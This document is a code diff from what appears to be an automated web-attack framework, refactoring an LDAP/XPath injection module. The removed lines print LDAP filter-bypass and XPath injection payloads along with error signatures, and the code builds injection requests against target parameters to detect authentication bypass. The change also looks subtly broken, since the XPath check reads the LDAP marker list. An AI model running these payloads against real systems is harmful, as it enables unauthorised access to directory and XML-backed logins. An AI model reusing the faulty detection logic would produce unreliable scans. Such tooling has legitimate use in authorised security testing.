@@ -12,11 +12,7 @@ import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionRes
 import { claimFor, assessAccess } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeCompare } from './observers'
-
-const LDAP_BYPASS = ['*)(uid=*))(|(uid=*', '*)(&(uid=*', ')(|(uid=*))', '*)(objectClass=*']
-const LDAP_ERROR = ['ldap', 'directory', 'javax.naming', 'invalid filter', 'operations error']
-const XPATH_PAYLOADS = ["' or '1'='1", "'] | //* | //*[", "1=1 and 'a'='a", "') or 1=1 or ('"]
-const XPATH_ERROR = ['xpath', 'xpathException', 'xml', 'invalid expression', 'msxml', 'saxon']
+import { getPayloadStore } from '../payloads/store'
 
 function urlWithParam(url: string, param: string, value: string): string {
   try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
@@ -37,10 +33,13 @@ export const ldapXpathInjection: TechniquePrimitive = {
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'user'
     const headers = { ...(ctx.sessionHeaders ?? {}) }
     const steps: AttackStep[] = []
-    LDAP_BYPASS.forEach((p, i) => {
+    const ldapPayloads = ctx.payloadSet ?? getPayloadStore().getPayloads('ldap/injection', 'ldap')
+    const xpathPayloads = getPayloadStore().getPayloads('ldap/injection', 'xpath')
+    const ldapErrors = getPayloadStore().getMarkers('ldap/injection')
+    ldapPayloads.forEach((p, i) => {
       steps.push({ id: `ldap-${i}`, description: `LDAP bypass into ${param}`, request: { method, url: urlWithParam(url, param, p), headers }, expectedSignal: 'auth bypass / directory error', metadata: { kind: 'ldap', param, payload: p } })
     })
-    XPATH_PAYLOADS.forEach((p, i) => {
+    xpathPayloads.forEach((p, i) => {
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
       steps.push({ id: `xpath-${i}`, description: `XPath injection into ${param}`, request: { method, url: urlWithParam(url, param, p), headers, ...(body ? { body } : {}) }, expectedSignal: 'xpath error / boolean differential', metadata: { kind: 'xpath', param, payload: p } })
     })
@@ -55,13 +54,14 @@ export const ldapXpathInjection: TechniquePrimitive = {
       const lower = (r.body ?? '').toLowerCase()
       if (kind === 'ldap') {
         const access = assessAccess({ status: r.status, body: r.body, grantsOn2xx: true })
-        const err = LDAP_ERROR.some((m) => lower.includes(m))
+        const err = ldapErrors.some((m) => lower.includes(m))
         if ((access.granted && !access.denied) || err) {
           ldapHit = true
           evidence.push({ kind: 'response', label: `LDAP injection ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1000) })
         }
       } else if (kind === 'xpath') {
-        const err = XPATH_ERROR.some((m) => lower.includes(m))
+        const xpathErrors = getPayloadStore().getMarkers('ldap/injection')
+        const err = xpathErrors.some((m) => lower.includes(m))
         if (err) {
           xpathHit = true
           evidence.push({ kind: 'response', label: `XPath injection error ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1000) })
